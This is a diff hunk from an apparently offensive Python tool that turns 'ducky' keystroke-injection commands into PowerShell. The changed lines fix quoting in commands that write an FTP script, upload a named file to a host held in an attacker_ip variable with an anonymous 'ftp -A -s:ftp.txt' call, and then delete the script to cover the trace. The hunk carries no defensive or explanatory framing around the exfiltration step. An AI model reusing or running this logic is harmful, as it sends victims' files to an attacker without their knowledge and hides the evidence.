@@ -196,8 +196,8 @@ while not stop:
             options = [x for x in ducky_command.split(" ")[1:] if x]
             filename = ducky_command.split("\"")[1]
             commands = []
-            commands.append("out-file -inputobject \"put " + filename + "\" -encoding ascii ftp.txt")
-            commands.append("out-file -inputobject \"quit\" -encoding ascii -append ftp.txt")
+            commands.append("out-file -inputobject \'put \"" + filename + "\"\' -encoding ascii ftp.txt")
+            commands.append("out-file -inputobject \'quit\' -encoding ascii -append ftp.txt")
             commands.append("ftp -A -s:ftp.txt " + attacker_ip)
             commands.append("rm ftp.txt")
             stdin = "; ".join(commands)
